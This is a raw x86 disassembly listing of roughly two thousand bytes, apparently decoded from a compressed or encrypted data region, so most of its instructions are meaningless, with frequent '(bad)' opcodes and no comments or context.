  417929:	xor    BYTE PTR [ecx-0x33f3df42],bl
  41792f:	rol    edx,1
  417931:	rol    bh,1
  417933:	ret    
  417934:	cmp    DWORD PTR [ebp+0x2e92f813],ecx
  41793a:	mov    bl,0x83
  41793c:	(bad)  
  41793d:	rol    BYTE PTR [esi+0x396b],0x0
	...
  4179b4:	retf   
  4179b5:	pusha  
  4179b6:	ror    BYTE PTR [ebx+0x60dbbbfb],1
  4179bc:	lea    esi,[esi-0x717d3680]
  4179c2:	xor    ebp,edx
  4179c4:	dec    ebp
  4179c5:	add    DWORD PTR [ecx],eax
  4179c7:	add    ch,dh
  4179c9:	add    BYTE PTR [eax],al
  4179cb:	add    bl,cl
  4179cd:	add    esp,ecx
  4179cf:	fwait
  4179d0:	pop    edi
  4179d1:	(bad)  
  4179d2:	fisubr DWORD PTR [eax]
  4179d4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4179d5:	(bad)  
  4179d9:	xchg   ebp,eax
  4179da:	aam    0x33
  4179dc:	sbb    al,ch
  4179de:	xor    esi,ebx
  4179e0:	sbb    DWORD PTR [eax+ebx*8+0x48d253e7],ebp
  4179e7:	dec    esi
  4179e8:	inc    esi
  4179e9:	sbb    esp,DWORD PTR [ecx-0x37]
  4179ec:	pop    eax
  4179ed:	adc    ecx,edx
  4179ef:	xchg   ebp,eax
  4179f0:	xlat   BYTE PTR ds:[ebx]
  4179f1:	sbb    BYTE PTR ds:0x4cd31de5,0x23
  4179f8:	push   cs
  4179f9:	mov    ecx,0xac156639
  4179fe:	pop    edx
  4179ff:	clc    
  417a00:	jae    0x4179bd
  417a02:	xchg   esi,eax
  417a03:	sar    DWORD PTR [edx+0x6f],cl
  417a06:	mov    ebp,0xc5d1bb2e
  417a0b:	cmc    
  417a0c:	xor    BYTE PTR [ecx+0x4a],ah
  417a0f:	fadd   DWORD PTR [ecx+ecx*1+0xe]
  417a13:	fcmovb st,st(5)
  417a15:	sar    DWORD PTR [esi+edi*1-0x4cb18415],0x54
  417a1d:	adc    DWORD PTR [ecx],ebp
  417a1f:	jge    0x417a27
  417a21:	fcomp  QWORD PTR [edi]
  417a23:	dec    esi
  417a24:	call   0xbb24:0x920ebdf8
  417a2b:	rol    DWORD PTR [edi],0x13
  417a2e:	mov    ds:0x602443c,eax
  417a33:	cdq    
  417a34:	jo     0x417aa2
  417a36:	cmp    BYTE PTR [eax*2-0x4ebecafe],cl
  417a3d:	xchg   ecx,eax
  417a3e:	inc    edx
  417a3f:	mov    BYTE PTR [esi-0x65],dl
  417a42:	outs   dx,DWORD PTR ds:[esi]
  417a43:	sti    
  417a44:	dec    edi
  417a45:	ror    DWORD PTR [ebp-0x424b2776],1
  417a4b:	cdq    
  417a4c:	jl     0x417aa5
  417a4e:	shl    BYTE PTR ds:0xae84abb5,cl
  417a54:	push   ecx
  417a55:	mov    edi,cs
  417a57:	cmp    al,BYTE PTR [esi+0x2ff6953e]
  417a5d:	xchg   esi,eax
  417a5e:	and    cl,BYTE PTR [eax]
  417a60:	mov    cl,0x96
  417a62:	enter  0x9f38,0xad
  417a66:	leave  
  417a67:	mov    esp,0x1349a106
  417a6c:	mov    bh,0xb3
  417a6e:	or     dl,BYTE PTR [eax-0x24]
  417a71:	inc    edi
  417a72:	sbb    DWORD PTR [esi-0x6c1ad178],0xffffffaf
  417a79:	xchg   BYTE PTR [edi-0x5fee3801],dl
  417a7f:	xchg   ebp,eax
  417a80:	inc    ebx
  417a81:	sbb    esp,DWORD PTR [edx+0x43]
  417a84:	cmc    
  417a85:	cmp    BYTE PTR [eax],bh
  417a87:	js     0x417ad0
  417a89:	inc    ecx
  417a8a:	mov    cl,0x68
  417a8c:	add    BYTE PTR [edi],cl
  417a8e:	out    dx,eax
  417a8f:	jp     0x417a7d
  417a91:	sub    dl,BYTE PTR [ebx+esi*8+0x1c1f6397]
  417a98:	xor    eax,0x68c6f08a
  417a9d:	mul    BYTE PTR [edi+0x2377a361]
  417aa3:	leave  
  417aa4:	sub    edi,edx
  417aa6:	pop    esi
  417aa7:	aaa    
  417aa8:	or     al,0xe1
  417aaa:	sub    DWORD PTR [ebx-0x74],0xffffff9c
  417aae:	inc    edi
  417aaf:	xchg   esi,eax
  417ab0:	les    eax,FWORD PTR [ecx]
  417ab2:	push   0x43
  417ab4:	sub    eax,DWORD PTR [edi]
  417ab6:	pop    ebx
  417ab7:	xor    BYTE PTR [edx+0x75018325],0xb1
  417abe:	dec    eax
  417abf:	lock inc edi
	...
  417b31:	add    BYTE PTR [eax],al
  417b33:	add    bl,ah
  417b35:	gs push cs
  417b37:	test   DWORD PTR [esi+0x6a75fbff],0x3bfef5f7
  417b41:	pop    eax
  417b42:	ffreep st(6)
  417b44:	inc    edx
  417b45:	add    al,BYTE PTR [ecx]
  417b47:	add    ch,dh
  417b49:	add    BYTE PTR [eax],al
  417b4b:	add    BYTE PTR [ebp-0xe4ae5e],bh
  417b51:	xor    eax,0x3c1c7241
  417b56:	sub    dl,BYTE PTR ss:[esi-0x6708e294]
  417b5d:	mov    ch,BYTE PTR [esi-0x18]
  417b60:	sbb    al,0x26
  417b62:	scas   al,BYTE PTR es:[edi]
  417b63:	fcmovnu st,st(4)
  417b65:	sub    DWORD PTR [edi-0x1c],eax
  417b68:	adc    eax,0x7496c399
  417b6d:	ret    0xd0b5
  417b70:	mov    bl,0x2c
  417b72:	cmp    DWORD PTR [si],ebp
  417b75:	jg     0x417bdf
  417b77:	pop    edx
  417b78:	(bad)  
  417b79:	cmp    ebx,ecx
  417b7b:	mov    ebx,0x2668ee42
  417b80:	push   edx
  417b81:	clc    
  417b82:	mov    eax,DWORD PTR [eax]
  417b84:	inc    edx
  417b85:	dec    edi
  417b86:	sbb    al,BYTE PTR [eax-0x9b1868b]
  417b8c:	lods   al,BYTE PTR ds:[esi]
  417b8d:	or     BYTE PTR [eax+edi*8],ah
  417b90:	pop    es
  417b91:	lds    eax,FWORD PTR [eax-0x2a5d9f9c]
  417b97:	mov    bh,0x24
  417b99:	dec    edi
  417b9a:	out    dx,eax
  417b9b:	test   ecx,esp
  417b9d:	bound  esp,QWORD PTR [ecx+ecx*4-0x22ef6b5a]
  417ba4:	in     eax,0x8e
  417ba6:	jl     0x417b4e
  417ba8:	hlt    
  417ba9:	add    eax,0xf53e2ee0
  417bae:	mov    bl,0xee
  417bb0:	dec    ecx
  417bb1:	push   cs
  417bb2:	mov    ch,0xa1
  417bb4:	adc    esp,eax
  417bb6:	fwait
  417bb7:	xor    BYTE PTR cs:[esi+edi*2-0x3f],bl
  417bbc:	(bad)  
  417bbe:	cdq    
  417bbf:	js     0x417b45
  417bc1:	(bad)  
  417bc2:	xchg   DWORD PTR [edi+0x50],ebx
  417bc5:	out    dx,eax
  417bc6:	mov    dh,0x3b
  417bc8:	popf   
  417bc9:	(bad)  
  417bca:	mov    ah,0x2d
  417bcc:	outs   dx,BYTE PTR ds:[esi]
  417bcd:	outs   dx,BYTE PTR ds:[esi]
  417bce:	dec    ecx
  417bcf:	mov    dh,ah
  417bd1:	mov    ds:0x2046e097,eax
  417bd6:	jecxz  0x417bb7
  417bd8:	jnp    0x417bf5
  417bda:	imul   edi,DWORD PTR [ecx-0x3a],0xe3785a44
  417be1:	fist   WORD PTR [ebp-0x76ebdb60]
  417be7:	outs   dx,BYTE PTR ds:[esi]
  417be8:	int3   
  417be9:	pop    esp
  417bea:	test   BYTE PTR [ebp-0x23],0x25
  417bee:	push   ds
  417bef:	ins    BYTE PTR es:[edi],dx
  417bf0:	mov    bh,0xfc
  417bf2:	xor    edx,DWORD PTR [edx+0x130eda50]
  417bf8:	neg    DWORD PTR es:[edi]
  417bfb:	sbb    al,0xf8
  417bfd:	sbb    bl,cl
  417bff:	repz sub ah,BYTE PTR [edi-0x62]
  417c03:	mov    esp,0x7ce22025
  417c08:	call   0x163d0399
  417c0d:	in     al,0x43
  417c0f:	push   esp
  417c10:	adc    bh,al
  417c12:	fs es leave 
  417c15:	sbb    BYTE PTR [esi+0x6fcf5efa],dl
  417c1b:	lock xlat BYTE PTR ds:[ebx]
  417c1d:	dec    esi
  417c1e:	or     al,0xe5
  417c20:	mov    al,BYTE PTR ds:0x2787f10f
  417c26:	pop    esp
  417c27:	inc    eax
  417c28:	icebp  
  417c29:	js     0x417c86
  417c2b:	pop    edx
  417c2c:	jns    0x417bef
  417c2e:	cmp    edi,DWORD PTR [ebp+0x5aca61be]
  417c34:	mov    eax,DWORD PTR [edx+edi*2]
  417c37:	add    edx,DWORD PTR [ecx+ebp*2+0x19ce976f]
  417c3e:	ret    
  417c3f:	leave  
  417c40:	mov    ch,0x0
	...
  417cb2:	add    BYTE PTR [eax],al
  417cb4:	and    DWORD PTR [ebx-0x40445077],edx
  417cba:	daa    
  417cbb:	lahf   
  417cbc:	(bad)  
  417cbd:	jle    0x417d17
  417cbf:	sbb    esp,edx
  417cc1:	cmc    
  417cc2:	popa   
  417cc3:	ret    0x337
  417cc6:	add    DWORD PTR [eax],eax
  417cc8:	cmc    
  417cc9:	add    BYTE PTR [eax],al
  417ccb:	add    BYTE PTR [eax-0x80],bl
  417cce:	mov    ecx,0xe493b0b5
  417cd3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417cd4:	pusha  
  417cd5:	inc    ebx
  417cd6:	dec    ebp
  417cd7:	out    0xb2,eax
  417cd9:	call   0x6e8e:0xce8d
  417cdf:	jp     0x417c6a
  417ce1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417ce2:	push   cs
  417ce3:	cmovg  esi,ecx
  417ce6:	inc    edi
  417ce7:	fst    DWORD PTR [eax+0x2577c2c2]
  417ced:	xor    al,0x4a
  417cef:	sbb    BYTE PTR [edi+0x7],al
  417cf2:	in     al,dx
  417cf3:	call   0x6629:0xf96fe1af
  417cfa:	ret    0xf6d0
  417cfd:	rcr    BYTE PTR [esi+ecx*2-0x40d1ec52],1
  417d04:	inc    ecx
  417d05:	retf   0xc60c
  417d08:	push   edi
  417d09:	dec    DWORD PTR [ebx-0x7470770b]
  417d0f:	push   ebx
  417d10:	inc    esi
  417d11:	out    dx,al
  417d12:	nop
  417d13:	call   0x30d5097c
  417d18:	(bad)  
  417d19:	jbe    0x417cad
  417d1b:	mov    eax,ds:0x87635e
  417d20:	push   ebx
  417d21:	adc    bh,BYTE PTR [eax]
  417d23:	inc    esp
  417d24:	dec    ebp
  417d25:	mov    ebp,0xf9128d2d
  417d2a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417d2b:	cmp    BYTE PTR [ebp-0x5c81dcb3],ch
  417d31:	push   edx
  417d32:	call   0xb299:0x2d60bb14
  417d39:	jge    0x417d76
  417d3b:	add    BYTE PTR [esi+0x5ed642a0],bh
  417d41:	pop    ds
  417d42:	lods   eax,DWORD PTR ds:[esi]
  417d43:	retf   0x9592
  417d46:	ficomp WORD PTR [edx]
  417d48:	ins    BYTE PTR es:[edi],dx
  417d49:	sahf   
  417d4a:	pop    DWORD PTR [edx-0x3e]
  417d4d:	out    0x1,al
  417d4f:	sar    al,1
  417d51:	jecxz  0x417d57
  417d53:	(bad)  
  417d54:	out    dx,al
  417d55:	mov    esi,0xf734faba
  417d5a:	push   ebp
  417d5b:	cwde   
  417d5c:	stos   DWORD PTR es:[edi],eax
  417d5d:	inc    ebx
  417d5e:	dec    eax
  417d5f:	and    bl,dl
  417d61:	scas   eax,DWORD PTR es:[edi]
  417d62:	je     0x417cf0
  417d64:	es sbb dh,dl
  417d67:	xchg   ebx,eax
  417d68:	or     ah,BYTE PTR [edx-0x7a]
  417d6b:	jnp    0x417d85
  417d6d:	call   0x60b663a7
  417d72:	dec    ebx
  417d73:	mov    al,ds:0x36af0540
  417d78:	lock xchg edx,eax
  417d7a:	in     eax,0x73
  417d7c:	cmp    DWORD PTR [ebx],esp
  417d7e:	cmp    ebx,esi
  417d80:	aad    0x9d
  417d82:	sbb    eax,0xe19bf48f
  417d87:	leave  
  417d88:	lods   eax,DWORD PTR ds:[esi]
  417d89:	inc    eax
  417d8a:	pop    ds
  417d8b:	jmp    0x47ff:0x54252c46
  417d92:	push   es
  417d93:	ja     0x417deb
  417d95:	sbb    BYTE PTR [edx+0x5eef6f07],0x4b
  417d9c:	mov    WORD PTR ds:[ecx+eiz*2],?
  417da0:	clc    
  417da1:	cdq    
  417da2:	adc    ecx,DWORD PTR [edx-0x66]
  417da5:	sub    al,BYTE PTR [ebx-0x7a]
  417da8:	inc    eax
  417da9:	retf   0x67ba
  417dac:	sbb    edx,edx
  417dae:	popf   
  417daf:	imul   eax,edi,0xb147b127
  417db5:	mov    edx,0x36312014
  417dba:	out    dx,eax
  417dbb:	(bad)  
  417dbc:	xor    DWORD PTR [edx-0x3b],0x38ca
	...
  417e33:	add    BYTE PTR [edi-0x519271e7],bh
  417e39:	(bad)  
  417e3a:	(bad)  
  417e3b:	(bad)  
  417e3d:	xlat   BYTE PTR ds:[ebx]
  417e3e:	aam    0xef
  417e40:	std    
  417e41:	or     DWORD PTR [ecx+eax*8+0x1042c],ebp
  417e48:	cmc    
  417e49:	add    BYTE PTR [eax],al
  417e4b:	add    BYTE PTR [esi-0xc],ch
  417e4e:	push   cs
  417e4f:	gs xchg ebp,eax
  417e51:	inc    eax
  417e52:	cmp    bh,dl
  417e54:	pop    ss
  417e55:	and    BYTE PTR [esi+0x222c898b],bl
  417e5b:	outs   dx,BYTE PTR ds:[esi]
  417e5c:	in     eax,0xb8
  417e5e:	mov    es:0xe81df525,al
  417e64:	sub    ah,cl
  417e66:	cmc    
  417e67:	pop    es
  417e68:	popa   
  417e69:	lods   al,BYTE PTR ds:[esi]
  417e6a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417e6b:	add    bh,BYTE PTR [esi+0x26661930]
  417e71:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417e72:	loopne 0x417ebe
  417e74:	rol    DWORD PTR [ebp-0x1a],1
  417e77:	stos   BYTE PTR es:[edi],al
  417e78:	stos   DWORD PTR es:[edi],eax
  417e79:	adc    esp,DWORD PTR [ecx-0x61]
  417e7c:	out    0xd2,al
  417e7e:	repnz std 
  417e80:	enter  0xa73c,0x34
  417e84:	cmp    ch,BYTE PTR [edi-0x284b7230]
  417e8a:	push   esp
  417e8b:	push   cs
  417e8c:	call   0x8034:0x6e713d77
  417e93:	aas    
  417e94:	xor    al,0xd6
  417e96:	or     eax,0x5e1517fb
  417e9b:	test   al,0x5f
  417e9d:	sbb    al,0xfd
  417e9f:	adc    dl,al
  417ea1:	adc    al,0x35
  417ea3:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  417ea5:	cmp    edx,DWORD PTR [edi]
  417ea7:	pop    edx
  417ea8:	repz mov cl,0xc7
  417eab:	push   ss
  417eac:	bound  ebp,QWORD PTR [ebx+edx*4]
  417eaf:	mov    esp,0x7cfd340f
  417eb4:	ds enter 0x20d2,0xc0
  417eb9:	imul   ebp,DWORD PTR [ecx+0xd],0xae8193d3
  417ec0:	pusha  
  417ec1:	sub    ebp,DWORD PTR [ecx+0x3fecf832]
  417ec7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417ec8:	sbb    esi,DWORD PTR [ebx+0x75c3c421]
  417ece:	aaa    
  417ecf:	out    dx,al
  417ed0:	or     BYTE PTR [ebp+0x2ea4aaf0],ch
  417ed6:	inc    eax
  417ed7:	push   edi
  417ed8:	dec    eax
  417ed9:	adc    ebp,ebp
  417edb:	push   ebp
  417edc:	popa   
  417edd:	xchg   esi,eax
  417ede:	push   0x30
  417ee0:	mov    edx,0xde2de94d
  417ee5:	in     al,0xa2
  417ee7:	inc    ebp
  417ee8:	ins    DWORD PTR es:[edi],dx
  417ee9:	jbe    0x417ee5
  417eeb:	pop    edx
  417eec:	aam    0x9e
  417eee:	ja     0x417ebd
  417ef0:	mov    edx,DWORD PTR [edi]
  417ef2:	int3   
  417ef3:	es mov bh,0x50
  417ef6:	jno    0x417ebe
  417ef8:	pushf  
  417ef9:	inc    ecx
  417efa:	xor    ebx,DWORD PTR [esi-0x71]
  417efd:	popf   
  417efe:	les    eax,FWORD PTR [edi+ecx*4-0x52]
  417f02:	fsub   QWORD PTR [eax]
  417f04:	jbe    0x417e97
  417f06:	xor    esp,DWORD PTR [edi]
  417f08:	clc    
  417f09:	es scas eax,DWORD PTR es:[edi]
  417f0b:	adc    eax,0x9626bdfc
  417f10:	leave  
  417f11:	in     eax,dx
  417f12:	add    DWORD PTR [esi],eax
  417f14:	or     BYTE PTR [esi-0x4f],cl
  417f17:	(bad)  
  417f18:	jmp    0x5b0bf198
  417f1d:	push   esp
  417f1e:	daa    
  417f1f:	pop    eax
  417f20:	leave  
  417f21:	retf   0xc1da
  417f24:	imul   edx,DWORD PTR [edx+0x582fdaa5],0x7fa59e20
  417f2e:	fdiv   DWORD PTR [esp+edi*1+0x3f956984]
  417f35:	(bad)  [ecx-0x3b]
  417f38:	js     0x417eec
  417f3a:	add    bl,BYTE PTR [eax]
  417f3c:	fwait
  417f3d:	push   ebx
  417f3e:	(bad)  
  417f3f:	push   0x95
	...
  417fb4:	jbe    0x417fe3
  417fb6:	push   ebp
  417fb7:	inc    ecx
  417fb8:	pop    edi
  417fb9:	jns    0x418031
  417fbb:	aas    
  417fbc:	fisttp DWORD PTR [esi-0x68]
  417fbf:	inc    edx
  417fc0:	ins    DWORD PTR es:[edi],dx
  417fc1:	xchg   ebx,eax
  417fc2:	adc    esp,DWORD PTR [eax+0x21]
  417fc5:	add    eax,0xf50001
  417fca:	add    BYTE PTR [eax],al
  417fcc:	or     DWORD PTR [edi],esi
  417fce:	push   cs
  417fcf:	stos   BYTE PTR es:[edi],al
  417fd0:	out    dx,al
  417fd1:	aam    0xbc
  417fd3:	mov    bl,0xb1
  417fd5:	sbb    BYTE PTR [ebx+0x70],al
  417fd8:	push   esp
  417fd9:	test   BYTE PTR [edi-0x47b4e196],al
  417fdf:	jne    0x417f9c
  417fe1:	mov    eax,ds:0xa1a6fe27
  417fe6:	(bad)  
  417fe8:	loopne 0x417fbf
  417fea:	dec    eax
  417feb:	and    al,0xba
  417fed:	repz inc ebp
  417fef:	add    al,0x35
  417ff1:	sub    al,BYTE PTR [eax+0x7633ef75]
  417ff7:	sar    DWORD PTR [ebx-0x65],0x42
  417ffb:	sub    al,0x86
  417ffd:	out    0x47,eax
  417fff:	xor    DWORD PTR [eax-0x1a202d8c],esp
  418005:	mov    eax,0x11b4e6dd
  41800a:	pop    edi
  41800b:	(bad)
  41800f:	push   es
  418010:	and    edx,DWORD PTR [ebp-0x1b83fab7]
  418016:	xchg   ebp,eax
  418017:	jne    0x417fa3
  418019:	or     eax,0x5938875d
  41801e:	inc    ebx
  41801f:	(bad)  
  418020:	cwde   
  418021:	pop    eax
  418022:	repz sbb BYTE PTR [eax],0x43
  418026:	shl    esp,cl
  418028:	scas   al,BYTE PTR es:[edi]
  418029:	mov    ebp,DWORD PTR [esi+0x3e]
  41802c:	imul   ebx,DWORD PTR [ecx-0x2d3c4033],0xa8e95bf8
  418036:	cdq    
  418037:	clc    
  418038:	xchg   esi,eax
  418039:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41803a:	adc    al,0x6
  41803c:	in     al,dx
  41803d:	aam    0x54
  41803f:	sub    ch,BYTE PTR [esi+ebx*8]
  418042:	es jno 0x418040
  418045:	dec    edi
  418046:	jmp    DWORD PTR [eax+0x466167aa]
  41804c:	jecxz  0x417fd1
  41804e:	push   ebx
  41804f:	add    edi,DWORD PTR [eax+0x17]
  418052:	pop    esp
  418053:	in     al,dx
  418054:	pop    es
  418055:	or     DWORD PTR [eax-0x6e],esp
  418058:	hlt    
  418059:	sub    bh,BYTE PTR [edx+0x688aec5e]
  41805f:	mov    ds:0xe5d432ca,al
  418064:	inc    ebx
  418065:	mov    ch,0x5
  418067:	test   BYTE PTR [eax+0x41],0x7b
  41806b:	sbb    bl,BYTE PTR [ecx]
  41806d:	jmp    0x72a2:0xd6d34f1b
  418074:	leave  
  418075:	mov    al,ds:0x4240399b
  41807a:	inc    esi
  41807b:	js     0x418012
  41807d:	xlat   BYTE PTR ds:[ebx]
  41807e:	dec    ecx
  41807f:	sub    DWORD PTR [esi],ebp
  418081:	xchg   DWORD PTR [ebx+edx*4-0x18671ddb],esp
  418088:	mov    eax,ds:0x99693f16
  41808d:	ja     0x418074
  41808f:	pop    edi
  418090:	cwde   
  418091:	dec    ebp
  418092:	leave  
  418093:	mov    ecx,0xac39b606
  418098:	cmp    al,0xd8
  41809a:	and    bh,BYTE PTR [edx]
  41809c:	imul   ecx,DWORD PTR [ebx],0x753477db
  4180a2:	clc    
  4180a3:	adc    edx,DWORD PTR [esi]
  4180a5:	addr16 retf 0x5a93
  4180a9:	pop    es
  4180aa:	cmp    BYTE PTR [edx-0x60c6ef11],bh
  4180b0:	sbb    al,0x62
  4180b2:	je     0x418057
  4180b4:	or     al,0x3f
  4180b6:	test   al,0xc5
  4180b8:	jb     0x418095
  4180ba:	or     edi,DWORD PTR [edx-0xf0b9e73]
  4180c0:	test   BYTE PTR [eax],0x0
	...
  418133:	add    BYTE PTR [esi-0xe58fe7],ah
  418139:	jnp    0x418129
  41813b:	mov    ebp,0xe8ea9e45
  418140:	add    DWORD PTR [ecx],0xffffffb4
  418143:	sub    edx,DWORD PTR [esi]
  418145:	push   es
  418146:	add    DWORD PTR [eax],eax
  418148:	cmc    
  418149:	add    BYTE PTR [eax],al
  41814b:	add    cl,bh
  41814d:	mov    edx,0x890d6790
  418152:	dec    ecx
  418153:	lods   eax,DWORD PTR ds:[esi]
  418154:	sbb    BYTE PTR [esi-0x1d],dh
  418157:	out    dx,al
  418158:	mov    ds:0x3f9393be,eax
  41815d:	inc    esp
  41815e:	sbb    DWORD PTR [esi+ecx*1],0x22
  418162:	adc    eax,DWORD PTR [edi]
  418164:	stos   DWORD PTR es:[edi],eax
  418165:	(bad)
  418169:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41816a:	sub    dh,bl
  41816c:	addps  xmm5,xmm0
  41816f:	push   es
  418170:	inc    ebp
  418171:	dec    esi
  418172:	cwde   
  418173:	cmp    eax,0xa85cee7f
  418178:	adc    BYTE PTR [eax+edx*4],dl
  41817b:	sub    eax,0x11e593a0
  418180:	mov    eax,ds:0xb5107b55
  418185:	mov    ecx,edi
  418187:	sbb    edi,eax
  418189:	or     edx,edx
  41818b:	xchg   edx,eax
  41818c:	fcmovnb st,st(1)
  41818e:	in     al,dx
  41818f:	out    0x2f,al
  418191:	je     0x4181d1
  418193:	cmp    DWORD PTR [eax+0x36],esi
  418196:	stc    
  418197:	fsqrt  
  418199:	lock rol WORD PTR [edx-0x39ab1559],0x66
  4181a2:	mov    eax,0x38dd23b
  4181a7:	(bad)  
  4181a8:	repz xchg ecx,eax
  4181aa:	pop    es
  4181ab:	cmp    eax,ebp
  4181ad:	mov    WORD PTR [edx+ebp*8-0x28],fs
  4181b1:	push   esi
  4181b2:	push   cs
  4181b3:	mov    eax,0x8c055021
  4181b8:	push   edi
  4181b9:	add    eax,0x5403a2e2
  4181be:	jbe    0x418147
  4181c0:	lea    ebp,[esi-0x1c145930]
  4181c6:	popf   
  4181c7:	xor    dh,dh
  4181c9:	sub    eax,0xb970f79b
  4181ce:	adc    BYTE PTR [esi-0x4474ebd9],ah
  4181d4:	add    bh,BYTE PTR [ecx+0x58]
  4181d7:	rcr    DWORD PTR [ebx-0xb],cl
  4181da:	add    eax,0x3b35f286
  4181df:	fld    DWORD PTR [edx-0x383d6cd7]
  4181e5:	and    BYTE PTR [esi],dh
  4181e7:	repnz xchg esp,eax
  4181e9:	cs sub al,0xb8
  4181ec:	arpl   WORD PTR [esi-0x5f],dx
  4181ef:	push   ds
  4181f0:	in     eax,dx
  4181f1:	lods   eax,DWORD PTR ds:[esi]
  4181f2:	push   ebp
  4181f3:	or     eax,0x7724ea28
  4181f8:	fisttp WORD PTR [ecx]
  4181fa:	dec    ebx
  4181fb:	sbb    DWORD PTR [ecx+0x7cd06a78],0xffffff86
  418202:	out    dx,al
  418203:	call   0x84c1:0xdcc3c7c7
  41820a:	(bad)  
  41820c:	dec    esp
  41820d:	test   BYTE PTR [edi],bl
  41820f:	mov    edi,0x391ecc22
  418214:	inc    esp
  418215:	push   ebx
  418216:	mov    ds:0xbe806cf8,eax
  41821b:	pop    ss
  41821c:	mov    WORD PTR [ebp-0x76],?
  41821f:	push   0x69
  418221:	xor    DWORD PTR [eax+0x41],0x9
  418225:	pop    DWORD PTR [edi+0x76]
  418228:	xchg   ebp,eax
  418229:	pop    ecx
  41822a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41822b:	rcr    BYTE PTR [ebp+0x25],1
  41822e:	xor    eax,0x39f7fc87
  418233:	popf   
  418234:	int3   
  418235:	xchg   ecx,eax
  418236:	mov    bl,al
  418238:	or     ebx,DWORD PTR [ebx]
  41823a:	inc    esp
  41823b:	test   DWORD PTR [edx+0x15],0xff891a
	...
  4182b2:	add    BYTE PTR [eax],al
  4182b4:	imul   edi,DWORD PTR [edi+edx*8-0x168028a2],0x3ef3ecbf
  4182bf:	adc    DWORD PTR [ebx],ebx
  4182c1:	jmp    0x74d064d
  4182c6:	add    DWORD PTR [eax],eax
  4182c8:	cmc    
  4182c9:	add    BYTE PTR [eax],al
  4182cb:	add    BYTE PTR [ebx-0x2e],bh
  4182ce:	add    dh,BYTE PTR [ebx]
  4182d0:	call   0x745b9bfd
  4182d5:	push   eax
  4182d6:	xor    edx,DWORD PTR [edx]
  4182d8:	sbb    eax,0xa8432905
  4182dd:	jmp    0x4182da
  4182df:	jmp    0x41833f
  4182e1:	inc    ecx
  4182e2:	call   0xb298:0x4da8e4df
  4182e9:	fild   WORD PTR [edx-0x6a]
  4182ec:	mov    ah,0x39
  4182ee:	or     bl,BYTE PTR [eax-0x6a05e9a3]
  4182f4:	jno    0x4182d7
  4182f6:	and    esp,DWORD PTR [ecx]
  4182f8:	int3   
  4182f9:	lock mov esi,ecx
  4182fc:	fldcw  WORD PTR [edx-0x6b]
  4182ff:	out    0xb3,eax
  418301:	xchg   ebp,eax
  418302:	sti    
  418303:	push   cs
  418304:	mov    bl,0xdc
  418306:	cmp    ch,BYTE PTR [esi]
  418308:	sar    DWORD PTR fs:[eax-0x80],0xdc
  41830d:	mov    cl,0x95
  41830f:	mov    al,ds:0x3a38f6cd
  418314:	xchg   ebp,eax
  418315:	dec    eax
  418316:	cmp    ah,cl
  418318:	dec    esi
  418319:	std    
  41831a:	aaa    
  41831b:	stos   DWORD PTR es:[edi],eax
  41831c:	stos   BYTE PTR es:[edi],al
  41831d:	jl     0x418339
  41831f:	stos   BYTE PTR es:[edi],al
  418320:	mov    fs,WORD PTR [esi-0x474b5c83]
  418326:	dec    ebp
  418327:	pop    ds
  418328:	adc    DWORD PTR [ecx+0x6881c54c],0xffffff91
  41832f:	pop    es
  418330:	fsubrp st(2),st
  418332:	lods   eax,DWORD PTR ds:[esi]
  418333:	dec    ebp
  418334:	inc    edi
  418335:	inc    edi
  418336:	inc    esp
  418337:	fwait
  418338:	cmp    DWORD PTR [edx-0x48af873f],0xfffffff6
  41833f:	add    al,0x32
  418341:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418342:	gs out 0x89,al
  418345:	push   0xeabf5998
  41834a:	lahf   
  41834b:	xchg   esi,eax
  41834c:	imul   ecx,DWORD PTR gs:[ecx],0x37
  418350:	mov    al,ds:0x51eff8e5
  418355:	leave  
  418356:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418357:	jle    0x4183b7
  418359:	mov    ds:0xa44324e0,eax
  41835e:	test   BYTE PTR [ecx-0x41ae3067],cl
  418364:	cmp    BYTE PTR [edi+0x52e42c1e],dl
  41836a:	xlat   BYTE PTR ds:[ebx]
  41836b:	push   ecx
  41836c:	mov    bl,0x2e
  41836e:	mov    ebx,0xe491d73a
  418373:	mov    bl,0xb9
  418375:	loope  0x41834e
  418377:	icebp  
  418378:	imul   eax,DWORD PTR [edx],0xb356a2ac
  41837e:	scas   al,BYTE PTR es:[edi]
  41837f:	mov    esp,DWORD PTR [edi]
  418381:	stc    
  418382:	out    dx,al
  418383:	ret    
  418384:	hlt    
  418385:	or     al,0x38
  418387:	lds    eax,FWORD PTR [ebx+0x5f]
  41838a:	fsub   DWORD PTR [ebp-0x6f]
  41838d:	pop    ss
  41838e:	sub    dl,ch
  418390:	mov    ebp,0xcd743dcb
  418395:	or     esi,DWORD PTR [ebx+0xdea9c94]
  41839b:	sub    eax,0xb9340c48
  4183a0:	mov    ch,0x6f
  4183a2:	and    DWORD PTR [ecx+0x5835bcf4],ebx
  4183a8:	mov    al,0x42
  4183aa:	jmp    0x8cf31c55
  4183af:	inc    esp
  4183b0:	fimul  WORD PTR [ebp+0x2]
  4183b3:	mov    edi,0x6dce60f5
  4183b8:	add    dh,0xe5
  4183bb:	mov    ebp,0xfdbee4ad
  4183c0:	rol    BYTE PTR [eax],0x0
	...
  418433:	add    BYTE PTR [ecx+0x6b0c6aba],dl
  418439:	fdivr  st(7),st
  41843b:	mov    edi,0xdccd8f2d
  418440:	test   ebx,eax
  418442:	retf   0xe4
  418445:	or     BYTE PTR [ecx],al
  418447:	add    ch,dh
  418449:	add    BYTE PTR [eax],al
  41844b:	add    BYTE PTR [esi-0x5b],dh
  41844e:	jg     0x418452
  418450:	fcomp  QWORD PTR [eax-0x40c873a]
  418456:	mov    ds:0x87df5720,al
  41845b:	xor    DWORD PTR [ebx],edi
  41845d:	adc    dl,BYTE PTR cs:[esi+0x7a]
  418461:	jae    0x41846e
  418463:	icebp  
